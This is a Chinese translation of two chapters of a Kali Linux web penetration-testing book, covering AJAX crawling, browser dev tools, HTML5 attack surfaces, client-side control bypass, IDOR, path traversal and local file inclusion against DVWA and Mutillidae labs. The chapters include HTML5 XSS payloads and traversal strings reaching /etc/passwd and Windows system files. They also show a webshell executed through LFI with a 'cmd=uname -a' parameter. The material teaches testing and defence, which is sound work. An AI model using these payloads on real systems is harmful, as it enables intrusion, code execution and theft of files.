# Kali Linux Web 渗透测试第三版（三）

> 原文：[`annas-archive.org/md5/D70608E075A2D7C8935F4D63EA6A10A3`](https://annas-archive.org/md5/D70608E075A2D7C8935F4D63EA6A10A3)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第九章：AJAX、HTML5 和客户端攻击

在第一章中，我们回顾了 AJAX 和 HTML5 的功能和工作原理。在本章中，我们将深入探讨它们的安全方面以及它们如何在 Web 应用程序中引入或扩展漏洞，从而给渗透测试人员带来新的挑战。

如第一章所述，AJAX 是一种组合技术，主要包括 JavaScript、XML 和 Web 服务，它们允许客户端和服务器之间进行异步 HTTP 通信。

# 爬取 AJAX 应用程序

在基于 AJAX 的应用程序中，爬虫可以识别的链接取决于应用程序的逻辑流程。在本节中，我们将讨论三种用于爬取 AJAX 应用程序的工具：

+   AJAX Crawling Tool

+   Sprajax

+   AJAX Spider OWASP ZAP

与任何自动化任务一样，爬取 AJAX 应用程序必须仔细配置、记录和监控，因为它们可能会调用意外的函数并触发应用程序上的不希望的效果，例如影响数据库内容。

# AJAX 爬行工具

**AJAX Crawling Tool**（ACT）用于枚举 AJAX 应用程序。它可以与 Web 应用程序代理集成。爬取后，链接将在代理界面中可见。从那里，您可以测试应用程序的漏洞。要设置和使用 ACT，请按照以下说明操作：

1.  从以下 URL 下载 ACT：

[`code.google.com/p/fuzzops-ng/downloads/list`](https://code.google.com/p/fuzzops-ng/downloads/list)

1.  下载 ACT 后，使用以下命令从 bash shell 启动它：

```
      java -jar act.jar
```

此命令将生成以下截图中显示的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00228.jpeg)

指定目标 URL，并将代理设置为与您的代理链接。

在这种情况下，使用运行在本地主机上端口`8010`的 ZAP 代理。您还需要指定浏览器类型。要开始爬取，请单击 Crawl 菜单，然后选择 Start Crawl 选项。

1.  一旦 ACT 开始“蜘蛛爬行”应用程序，新的链接将在代理窗口中可见，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00229.jpeg)

# Sprajax

**Sprajax**是一个专门为使用 AJAX 框架构建的应用程序设计的 Web 应用程序扫描器。它是一个黑盒安全扫描器，这意味着它不需要预先配置目标应用程序的详细信息。它首先识别使用的 AJAX 框架，这有助于它创建具有较少误报的测试用例。Sprajax 还可以识别典型的应用程序漏洞，如 XSS 和 SQL 注入。它首先识别函数，然后通过发送随机值来模糊它们。**模糊**是向目标发送多个探测并分析它们的行为，以便在其中一个探测触发漏洞时检测到的过程。*OWASP Sprajax 项目*的 URL 是[`www.owasp.org/index.php/Category:OWASP_Sprajax_Project`](https://www.owasp.org/index.php/Category:OWASP_Sprajax_Project)。

除了 ACT 和 Sprajax，Burp Suite 代理和 OWASP ZAP 提供了爬取 AJAX 网站的工具，但手动爬取应用程序是侦察过程的重要部分，因为基于 AJAX 的应用程序可能包含许多隐藏的 URL，只有在了解应用程序的逻辑后才会暴露出来。

# AJAX Spider - OWASP ZAP

AJAX Spider 与 OWASP ZAP 集成。它使用一种简单的方法，通过浏览器跟踪所有可以找到的链接，甚至是由客户端代码生成的链接，从而有效地爬取各种应用程序。

可以从攻击菜单中调用 AJAX Spider，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00230.jpeg)

接下来，在 Spider 开始爬行过程之前，有一些参数需要配置。您可以选择插件使用的 Web 浏览器。在选项选项卡中，您还可以定义要打开的浏览器窗口数量、爬行深度和线程数量。在修改这些选项时要小心，因为它可能会减慢爬行速度：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00231.jpeg)

当爬行开始时，会打开一个浏览器窗口，ZAP 将自动浏览应用程序，而结果将在底部窗格的 AJAX Spider 选项卡中显示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00232.jpeg)

# 分析客户端代码和存储

我们之前已经讨论过客户端代码增加可能导致潜在安全问题的情况。AJAX 使用 XMLHttpRequest（XHR）对象向服务器发送异步请求。这些 XHR 对象是使用客户端 JavaScript 代码实现的。

有几种方法可以了解更多关于客户端代码的信息。通过按下 Ctrl + U 快捷键查看源代码将显示创建 XHR 对象的底层 JavaScript。如果网页和脚本很大，通过查看源代码来分析应用程序将不会有帮助和/或实用。

要了解脚本发送的实际请求，您可以使用 Web 应用程序代理并拦截流量，但请求将在通过客户端脚本代码的一系列过程后到达代理，这些过程可能包括验证、编码、加密和其他修改，这将使您对应用程序的工作原理的理解变得复杂。

在本节中，我们将使用 Web 浏览器的内置开发工具来分析客户端代码的行为以及它对页面上显示的内容和服务器从应用程序接收到的内容的影响。所有主要的现代 Web 浏览器都包含用于调试 Web 应用程序中的客户端代码的工具，尽管有些浏览器可能具有更多的功能。它们都包括以下基本组件：

+   页面元素的对象检查器

+   控制台输出以显示错误、警告和日志消息

+   脚本代码调试器

+   网络监视器以分析请求和响应

+   用于管理 Cookie、缓存和 HTML5 本地存储的存储管理器

大多数浏览器都遵循最初的 Firefox 插件 Firebug 的设计。我们将介绍 Firefox 的 Web 开发工具，因为它是 Kali Linux 中包含的工具。

# 浏览器开发工具

在 Firefox 中，与所有主要浏览器一样，可以使用 F12 键激活开发工具；在 Firefox 中还可以使用其他组合键，例如 Ctrl + C 和 Ctrl + I。下图显示了设置面板，您可以在其中选择要显示的工具以及其他首选项，如颜色主题、可用按钮和键绑定：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00233.jpeg)

# 检查器面板

检查器面板（如下图所示）显示当前页面中包含的 HTML 元素及其属性和样式设置。您可以更改这些属性和样式，还可以删除或添加元素：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00234.jpeg)

# 调试器面板

调试器面板是您可以深入了解实际 JavaScript 代码的地方。它包括一个调试器，您可以在其中设置断点或逐步执行脚本，同时分析客户端代码的流程并识别出有漏洞的代码。每个脚本都可以通过下拉菜单单独查看。Watch 侧面板将显示脚本执行过程中变量的值。设置的断点在 Breakpoints 面板下可见，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00235.jpeg)

调试器面板的一个最新添加功能是能够以更易读的方式格式化源代码，因为许多 JavaScript 库加载为单行文本。在 Firefox 中，此选项称为 Prettify Source，可以通过右键单击代码并从上下文菜单中选择来激活它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00236.jpeg)

# 控制台面板

控制台面板显示由 HTML 元素和脚本代码执行触发的日志、错误和警告。它还包括一个 JavaScript 命令行解释器，可在窗口底部可见。它允许您在当前网站的上下文中执行 JavaScript 代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00237.jpeg)

# 网络面板

网络面板显示当前网页生成的所有网络流量。它可以让您看到页面正在与哪里通信以及它正在进行哪些请求。它还包括对每个请求的响应和加载所需时间的可视化表示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00238.jpeg)

如果选择任何请求，您将看到头部和正文的详细信息，以及响应和 cookie：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00239.jpeg)

# 存储面板

存储面板也是最近添加的，用于允许与 HTML5 存储选项和 cookie 进行交互。在这里，您可以浏览和编辑 cookie、Web 存储、索引数据库和缓存存储：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00240.jpeg)

# DOM 面板

DOM 面板允许您查看和更改当前页面上所有 DOM 元素的值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00241.jpeg)

# HTML5 用于渗透测试

HTML 标准的最新版本带来了许多新功能，这些功能可能有助于开发人员防止其应用程序的安全缺陷和攻击。然而，它也给新功能的设计和实现带来了新的挑战，这可能导致应用程序由于使用尚未完全理解的新技术而向攻击者开放新的和意想不到的机会。

总的来说，渗透测试 HTML5 应用程序与测试任何其他 Web 应用程序没有区别。在本节中，我们将介绍 HTML5 的一些关键特性，它们对渗透测试的影响，以及实现这些特性的应用程序可能受到攻击的一些方式。

# 新的 XSS 向量

**跨站脚本**（**XSS**）是 HTML5 应用程序中的一个重大问题，因为 JavaScript 用于与从客户端存储到 WebSockets 到 Web Messaging 的所有新功能进行交互。

此外，HTML 包括可以用作 XSS 攻击向量的新元素和标签。

# 新元素

视频和音频是可以使用`<video>`和`<audio>`标签放入网页的新元素，这些标签也可以与`onerror`属性一起在 XSS 攻击中使用，就像`<img>`一样：

```
<video> <source onerror="javascript:alert(1)"> 
<video onerror="javascript:alert(1)"><source> 
<audio onerror="javascript:alert(1)"><source> 
```

# 新属性

表单元素具有可以用于执行 JavaScript 代码的新属性：

```
<input autofocus onfocus=alert("XSS")> 
```

`autofocus`属性指定在页面加载时`<input>`元素应自动获得焦点，`onfocus`设置当`<input>`元素获得焦点时的事件处理程序。结合这两个操作可以确保在页面加载时执行脚本：

```
<button form=form1 onformchange=alert("XSS")>X 
```

当对具有`form1` ID 的表单进行更改（值修改）时，将触发一个事件。该事件的处理程序是`XSS`负载：

```
<form><button formaction="javascript:alert(1)"> 
```

表单的 action 指示表单数据将被发送到的位置。在这个例子中，当按钮被按下时，它将 action 设置为一个 XSS 负载。

# 本地存储和客户端数据库

在 HTML5 之前，允许 Web 应用程序在客户端存储信息的唯一机制是 cookie。还有一些解决方法，如 Java 和 Adobe Flash，但它们带来了许多安全问题。HTML5 现在具有在客户端存储结构化和非结构化持久数据的能力，其中包括两个新功能：Web 存储和 IndexedDB。

作为渗透测试人员，您需要注意应用程序对客户端存储的任何使用。如果存储的信息是敏感的，请确保它得到适当的保护和加密。还要测试存储的信息是否在应用程序中进一步使用，并且是否可以篡改以生成 XSS 场景。最后，请确保此类信息在输入时得到正确验证，并在输出时进行清理。

# Web Storage

**Web Storage**是 HTML5 允许应用程序在客户端存储非结构化信息的方式，除了 cookie 之外。Web Storage 可以是两种类型：`localStorage`（没有过期时间）和`sessionStorage`（会在会话结束时删除）。Web Storage 由 JavaScript 对象`window.localStorage`和`window.sessionStorage`管理。

下面的屏幕截图显示了如何使用浏览器的开发者工具查看 Web Storage，本例中的类型为`localStorage`。如屏幕截图所示，信息使用键值对存储：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00242.jpeg)

# IndexedDB

对于结构化存储（以表为单位组织的信息），HTML5 提供了**IndexedDB**。

在 IndexedDB 之前，Web SQL Database 也被用作 HTML5 的一部分，但在 2010 年被弃用。

下面的屏幕截图显示了一个由 Web 应用程序存储的索引数据库的示例，可以使用浏览器的开发者工具查看：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00243.jpeg)

# Web Messaging

**Web Messaging**允许两个不需要 DOM 的文档之间进行通信，并且可以跨域使用（有时称为**跨域消息传递**）。要接收消息，应用程序需要设置一个事件处理程序来处理传入的消息。接收消息时触发的事件具有以下属性：

+   `data`：消息数据

+   `origin`：发送者的域名和端口

+   `lastEventId`：当前消息事件的唯一 ID

+   `source`：包含引发消息的文档窗口的引用

+   `ports`：这是一个包含与消息一起发送的任何`MessagePort`对象的数组

```
origin value is not checked. This means that any remote server will be able to send messages to that application. This constitutes a security issue, as an attacker can set up a server that sends messages to the application:
```

```
var messageEventHandler = function(event){ 
    alert(event.data); 
} 
```

下面的示例显示了一个事件处理程序，它进行了正确的来源验证：

```
window.addEventListener('message', messageEventHandler,false); 
var messageEventHandler = function(event){ 
    if (event.origin == 'https://trusted.domain.com') 
    { 
        alert(event.data); 
    } 
} 
window.addEventListener('message', messageEventHandler,false); 
```

# WebSockets

HTML5 中最激进的新增功能可能是引入了**WebSockets**，它是客户端和服务器之间基于 HTTP 协议的持久双向通信，HTTP 协议是无状态的协议。

如第一章所述，*渗透测试和 Web 应用程序简介*，WebSockets 通信始于客户端和服务器之间的握手。在下面的屏幕截图中，取自 Damn Vulnerable Web Sockets（[`github.com/snoopysecurity/dvws`](https://github.com/snoopysecurity/dvws)），您可以看到 WebSockets 的基本 JavaScript 实现：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00244.jpeg)

此代码在 HTML 文档加载后立即启动 WebSockets 连接。然后设置连接建立时、消息到达时以及连接关闭或发生错误时的事件处理程序。当页面加载请求以启动连接时，它看起来像这样：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00245.jpeg)

当连接被接受时，服务器将作出以下响应：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00246.jpeg)

请注意，请求中的`Sec-WebSocket-Key`和响应中的`Sec-WebSocket-Accept`仅用于握手和启动连接。它们不是身份验证或授权控制。这是渗透测试人员必须注意的事项。WebSockets 本身不提供任何身份验证或授权控制；这需要在应用程序级别完成。

此外，前面示例中实现的连接没有加密。这意味着它可以通过中间人攻击进行嗅探和/或拦截。下一个截图显示了使用 Wireshark 捕获的流量，显示了客户端和服务器之间的交换：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00247.jpeg)

前两个数据包是 WebSockets 握手。之后，消息交换开始。在这种情况下，客户端发送一个名称，服务器回复`Hello <NAME> :) How are you?`。按照协议定义（RFC 6455，[`www.rfc-base.org/txt/rfc-6455.txt`](http://www.rfc-base.org/txt/rfc-6455.txt)），从客户端发送到服务器的数据应该被掩码处理，如果接收到非掩码消息，服务器必须关闭连接。相反，从服务器发送到客户端的消息不会被掩码处理，如果接收到掩码数据，客户端将关闭连接。掩码处理不应被视为安全措施，因为掩码密钥包含在数据包帧中。

# 拦截和修改 WebSockets

Burp Suite 和 OWASP ZAP 等 Web 代理可以记录 WebSockets 通信。它们还能够拦截并允许添加传入和传出的消息。OWASP ZAP 还允许重新发送消息并使用 Fuzzer 工具来识别漏洞。

在 Burp Suite 的代理中，有一个选项卡显示了 WebSockets 通信的历史记录。代理中的常规拦截选项可用于拦截和修改传入和传出的消息。它不包括使用 Repeater 重新发送消息的功能。下一个截图显示了在 Burp Suite 中拦截的消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00248.jpeg)

OWASP ZAP 还有一个专门的 WebSockets 历史选项卡。在该选项卡中，可以通过右键单击任何消息并选择 Break...来设置断点（类似于 Burp Suite 的 Intercept）。将弹出一个新对话框，可以设置断点参数和条件，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00249.jpeg)

在右键单击消息时，还有一个 Resend 选项，它可以打开所选消息以进行修改和重新发送。这适用于传入和传出的流量。因此，当重新发送传出消息时，OWASP ZAP 将将消息传递给浏览器。下一个截图显示了重新发送对话框：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00250.jpeg)

如果在 Resend 中右键单击文本，会出现一个选项，可以对该消息进行模糊处理。

下一个截图显示了如何向默认位置添加模糊字符串。在这里，我们只添加了一小组 XSS 测试：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00251.jpeg)

当我们运行 Fuzzer 时，相应的选项卡会打开，并显示成功的结果（即，得到类似易受攻击应用程序的响应的结果）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00252.jpeg)

# HTML5 的其他相关功能

如前所述，HTML5 在不同领域中引入了许多功能，可能会影响应用程序的安全性。在本节中，我们将简要介绍 HTML5 提供的其他功能，这些功能也可能对我们寻找安全漏洞的方式和位置产生影响。

# 跨域资源共享（CORS）

当服务器启用时，请求中会发送头部`Access-Control-Allow-Origin`。该头部告诉客户端，服务器允许来自托管应用程序的源（域名和端口）以外的源的 XMLHttpRequest 请求。拥有以下头部允许来自任何源的请求，使得攻击者可以使用 JavaScript 绕过 CSRF 保护：

```
Access-Control-Allow-Origin: *  
```

# 地理位置

现代 Web 浏览器可以从安装了它们的设备中获取地理位置数据，无论是计算机中的 Wi-Fi 网络还是手机中的 GPS 和蜂窝信息。使用 HTML5 并且易受 XSS 攻击的应用程序可能会暴露其用户的位置数据。

# Web Workers

**Web Workers**是在后台运行的 JavaScript 代码，无法访问调用它们的页面的 DOM。除了能够在客户端运行本地任务外，它们还可以使用 XMLHttpRequest 对象执行域内和 CORS 请求。

如今，越来越多的 Web 应用程序使用 JavaScript 代码来利用客户端的处理能力来挖掘加密货币。大多数情况下，这是因为这些应用程序已经被入侵。如果应用程序容易受到 XSS 攻击，Web Workers 为攻击者提供了独特的机会，特别是如果它使用用户输入来向 Web Workers 发送消息或创建它们。

AppSec Labs 创建了一个工具包，*HTML5 Attack Framework* ([`appsec-labs.com/html5/`](https://appsec-labs.com/html5/))，用于测试 HTML5 应用程序的特定功能，例如以下功能：

+   点击劫持

+   CORS

+   HTML5 DoS

+   Web 消息传递

+   存储转储器

# 绕过客户端控制

随着现代 Web 应用程序在客户端的能力，开发人员有时更容易将检查和控制委托给由浏览器执行的客户端代码，从而使服务器免于额外的处理。起初，这可能看起来是个好主意；也就是说，让客户端处理所有数据呈现、用户输入验证、格式化，并仅使用服务器处理业务逻辑。然而，当客户端是一个 Web 浏览器时，它是一个多功能工具，不仅仅用于一个应用程序，并且可以使用代理来隧道化所有通信，然后可以被用户篡改和控制，开发人员需要在服务器端加强所有与安全相关的任务，如身份验证、授权、验证和完整性检查。作为渗透测试人员，您会发现很多应用程序在这方面做得不够一致。

一个非常常见的情况是应用程序根据用户的配置文件和权限级别显示或隐藏 GUI 元素和/或数据。很多时候，所有这些元素和数据已经从服务器检索到，并且只是使用 HTML 代码中的样式属性禁用或隐藏。攻击者或渗透测试人员可以使用浏览器的开发者工具中的检查器选项更改这些属性并访问隐藏的元素。

让我们通过*Mutillidae II 的客户端控制挑战*（其他 | 客户端“安全”控制）来回顾一个例子。这是一个具有许多不同类型的输入字段的表单，其中一些被禁用、隐藏或在您想要写入它们时移动。如果您只填写其中一些字段并点击提交，您将收到一个错误。您需要填写所有字段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00253.jpeg)

按下*F12*键打开开发者工具，或右键点击其中一个禁用的字段并选择检查元素。后者也会打开开发者工具，但它还会将您定位到检查器中的特定区域，并且是您选择的元素所在的区域：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00254.jpeg)

例如，您可以看到禁用的文本框具有一个属性`disabled`，其值为`1`。有人可能认为将值更改为`0`应该启用它，但事实并非如此。任何值都会使浏览器将输入显示为禁用状态。因此，双击属性名称并将其删除。现在您可以向其添加文本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00255.jpeg)

您可以继续更改所有字段的属性，以便填写它们。您还会找到一个密码字段。如果您检查它，您会发现即使页面上只显示点，它实际上包含明文值，在实际应用程序中可能是一个实际的密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00256.jpeg)

最后，当您填写完所有字段并再次点击提交时，会弹出一个警告，提示某些字段格式不正确：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00257.jpeg)

可以通过进入开发者工具中的调试器面板，并在搜索框中输入感叹号`!`来搜索所有文件中的部分文本，从而追踪此消息。`index.php`中的函数执行验证操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00258.jpeg)

请注意，此函数使用正则表达式验证输入，并且这些正则表达式被形成为仅匹配一个字符字符串。在这里，您可以做两件事：您可以在定义正则表达式之后设置断点并在运行时更改其值，和/或者您可以使用与这些检查匹配的值填充所有字段，以便可以发送请求，然后使用代理拦截请求并在代理中进行编辑。现在我们将进行后者：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00259.jpeg)

您可以在任何字段中输入任何值。如果您认为这与您的测试相关，请甚至可以添加或删除字段。

因此，使用浏览器的开发者工具，您可以轻松启用、禁用、显示或隐藏网页中的任何元素。它还可以让您监视、分析和控制 JavaScript 代码的执行流程。即使存在一个耗时低效的复杂验证过程，您也可以调整输入并在请求离开浏览器后使用代理进行修改。

# 缓解 AJAX、HTML5 和客户端漏洞

防止客户端漏洞的关键，或者至少是最小化其影响的关键，是*永远不要相信外部信息*，无论是来自客户端应用程序、Web 服务还是服务器输入。在处理之前，这些信息必须始终进行验证，并且在以任何格式（如 HTML、CSV、JSON 和 XML）显示给用户之前，所有显示给用户的数据必须经过适当的清理和格式化。在客户端进行验证是一个好的实践，但不能替代服务器端验证。

身份验证和授权检查也是如此。可以采取一些措施来减少到达服务器的无效请求的数量，但服务器端代码必须验证到达的请求确实是有效的，并且被允许继续到发送此类请求的用户会话。

对于 AJAX 和 HTML5，正确配置服务器和参数，如跨域、内容类型头和 Cookie 标志，将有助于防止许多攻击造成损害。

# 总结

在本章中，您了解了如何爬取 AJAX 应用程序。然后，我们继续审查 HTML5 对渗透测试人员的影响，包括新功能和新的攻击向量。然后，我们回顾了一些绕过客户端实施的安全控制的技术。在最后一节中，我们回顾了一些需要考虑的关键问题，以防止 AJAX、HTML5 和客户端漏洞。

在下一章中，您将了解更多关于 Web 应用程序中的日常安全漏洞。


# 第十章：Web 应用程序中的其他常见安全缺陷

到目前为止，在本书中，我们已经简要介绍了围绕 Web 应用程序安全和渗透测试的大部分问题。然而，由于 Web 应用程序的性质——它们代表了如此多样化的技术和方法论的混合，这些技术和方法论并不总是很好地协同工作——针对这些应用程序的特定漏洞和不同类型的攻击的数量是如此之大且迅速变化，以至于没有一本书能够涵盖所有内容；因此，有些东西必须被遗漏。

在本章中，我们将介绍一组常见的漏洞，这些漏洞通常存在于 Web 应用程序中，有时会逃脱开发人员和安全测试人员的关注，不是因为它们是未知的（实际上，有些在*OWASP Top 10*中），而是因为它们在现实世界的应用程序中的影响有时被低估，或者因为 SQL 注入和 XSS 等漏洞由于对用户信息的直接影响而更为重要。本章涵盖的漏洞如下：

+   不安全的直接对象引用

+   文件包含漏洞

+   HTTP 参数污染

+   信息泄露

# 不安全的直接对象引用

**不安全的直接对象引用**漏洞发生在应用程序从服务器请求资源（可以是文件、函数、目录或数据库记录）时，通过其名称或其他标识符，并允许用户直接篡改该标识符以请求其他资源。

让我们以 Mutillidae II 为例（导航到 OWASP Top 10 2013 | A4 - 不安全的直接对象引用 | 源代码查看器）。这个练习涉及一个源代码查看器，它从下拉框中选择一个文件名并在查看器中显示其内容：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00260.jpeg)

如果您在 Burp Suite 或任何代理中检查请求，您会发现它有一个`phpfile`参数，其中包含要查看的文件名：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00261.jpeg)

您可以尝试拦截该请求，将文件名更改为列表中没有的文件名，但您知道它存在于服务器上，例如`passwords/accounts.txt`（您可以使用互联网搜索默认配置文件或安装在 Web 服务器和某些应用程序上的相关代码）：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00262.jpeg)

由于应用程序直接引用文件名，您可以更改参数以使应用程序显示不打算查看的文件。

# Web 服务中的直接对象引用

Web 服务，特别是 REST 服务，通常使用 URL 中的标识符引用数据库元素。如果这些标识符是连续的，并且授权检查没有正确执行，那么只需增加或减少标识符就可以枚举所有元素。

例如，假设我们登录到银行应用程序，然后调用 API 请求我们的个人资料。此请求看起来类似于以下内容：

```
https://bankingexample.com/client/234752879  
```

信息以 JSON 格式返回，格式化并显示在客户端的浏览器上：

```
{ 
  "id": "234752879", 
  "client_name": "John", 
  "client_surname": "Doe", 
  "accounts": [{"acc_number":"123456789","balance":1000}, 
   {"acc_number":"123456780","balance":10000}] 
} 
```

如果我们在请求中递增客户端 ID，并且服务器上没有正确检查授权权限，我们可能会获取银行的另一个客户的信息。这可能是一个重大问题，因为这个应用程序处理如此敏感的数据。Web 服务应该只允许在适当的身份验证后访问，并始终在服务器端执行授权检查；否则，有人使用直接对象引用访问敏感数据的风险。不安全的直接对象引用是 Web 服务中令人担忧的主要原因，在渗透测试 RESTful Web 服务时应将其置于首要位置。

# 路径遍历

如果一个应用程序使用客户端提供的参数来构建文件的路径，并且进行了适当的输入验证和访问权限检查，攻击者可以更改文件的名称和/或在文件名前添加路径以检索不同的文件。这被称为路径遍历或目录遍历。大多数 Web 服务器已经被锁定以防止这种类型的攻击，但应用程序仍然需要在直接引用文件时验证输入。

用户应该被限制只能浏览 Web 根目录，不能访问 Web 根目录上方的任何内容。恶意用户将寻找指向 Web 根目录之外的文件的直接链接，其中最有吸引力的是操作系统的根目录。

基本的路径遍历攻击使用`../`序列通过 URL 修改资源请求。在操作系统中，`../`表达式用于向上移动一个目录。攻击者必须猜测移动和超出 Web 根目录所需的目录数量，这可以通过试错法轻松完成。如果攻击者想要向上移动三个目录，则必须使用`../../../`。

让我们使用 DVWA 来考虑一个例子：我们将使用“文件包含”练习来演示路径遍历。当页面加载时，您会注意到 URL 中有一个`page`参数，其值为`include.php`，这显然是按名称加载文件：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00263.jpeg)

如果您访问该 URL，您会发现加载`include.php`文件的页面位于应用程序的根目录（/vulnerabilities/fi/）下两个级别，服务器的根目录（dvwa/vulnerabilities/fi/）下三个级别。如果您将文件名替换为`../../index.php`，您将上升两个级别，然后显示 DVWA 的主页：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00264.jpeg)

您可以尝试逃离 Web 服务器根目录以访问操作系统中的文件。在 GNU / Linux 上，默认情况下，Apache Web 服务器的根目录位于/var/www/html。如果您在先前的输入中添加三个更多级别，您将引用操作系统的根目录。通过将`page`参数设置为`../../../../../etc/passwd`，您将能够读取包含底层操作系统上用户信息的文件：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00265.jpeg)

在基于 Unix 的系统中，/etc/passwd 路径是测试路径遍历的一个确定赌注，因为它始终存在并且可以被所有人读取。如果您正在测试 Windows 服务器，您可以尝试以下操作：

```
../../../../../autoexec.bat
../../../../../boot.ini
../../../../../windows/win.ini
```

# 文件包含漏洞

在 Web 应用程序中，开发人员可以包含存储在远程服务器上的代码或存储在本地服务器上的文件中的代码。引用不在 Web 根目录中的文件主要用于将常见代码合并到稍后可以由主应用程序引用的文件中。

当一个应用程序使用输入参数来确定要包含的文件的名称时，它就容易受到文件包含的攻击；因此，用户可以设置之前上传到服务器的恶意文件的名称（本地文件包含）或另一个服务器上的文件的名称（远程文件包含）。

# 本地文件包含

在**本地文件包含**（**LFI**）漏洞中，服务器上的本地文件被`include`函数访问而没有进行适当的验证；也就是说，包含了包含服务器代码的文件，并在页面中执行了它们的代码。对于开发人员来说，这是一个非常实用的功能，因为他们可以重用代码并优化资源。问题出现在使用用户提供的参数来选择要包含的文件时，以及进行不充分或没有验证。许多人将 LFI 缺陷与路径遍历缺陷混淆。尽管 LFI 缺陷通常表现出与路径遍历缺陷相同的特征，但应用程序对待这两种缺陷的方式是不同的。对于路径遍历缺陷，应用程序只会读取和显示文件的内容。对于 LFI 缺陷，应用程序不会显示内容，而是将文件包含为解释代码的一部分（构成应用程序的网页）并执行它。

在之前解释的路径遍历漏洞中，我们使用了 DVWA 的*文件包含*练习，并且当我们将`../../index.php`作为参数使用时，`index.php`页面被解释为代码执行了一个 LFI。然而，包含已经存在于服务器上并为应用程序提供合法目的的文件通常不会构成安全风险，除非非特权用户能够包含一个管理页面。在服务器上的所有页面都是无害的情况下，作为渗透测试人员，您如何证明存在安全问题，允许包含本地文件？您需要上传一个恶意文件并使用它进一步利用 LFI。

我们将上传的恶意文件是一个 webshell，它是一个在服务器上运行的脚本，可以让我们远程执行操作系统命令。Kali Linux 在`/usr/share/webshells`目录中包含了一系列的 webshell。在这个练习中，我们将使用`simple-backdoor.php`（`/usr/share/webshells/php/simple-backdoor.php`）。

进入 DVWA 的*文件上传*练习，并上传文件。注意文件上传时显示的相对路径：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00266.jpeg)

如果上传脚本位于`/dvwa/vulnerabilities/upload/`，相对于 Web 服务器根目录，根据显示的相对路径，文件应该上传到`/dvwa/hackable/uploads/simple-backdoor.php`。现在返回到*文件包含*练习，将`page`参数更改为`../../hackable/uploads/simple-backdoor.php`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00267.jpeg)

好的，诚然我们没有得到一个惊人的结果。让我们检查一下 webshell 的代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00268.jpeg)

您需要向 webshell 传递一个带有要执行的命令的参数，但在文件包含中，被包含文件的代码与包含它的文件集成在一起，所以您不能只是按照使用说明添加`?cmd=command`。相反，您需要添加一个`cmd`参数，就像将其发送给包含页面一样：

```
http://10.7.7.5/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/simple-backdoor.php&cmd=uname+-a
```

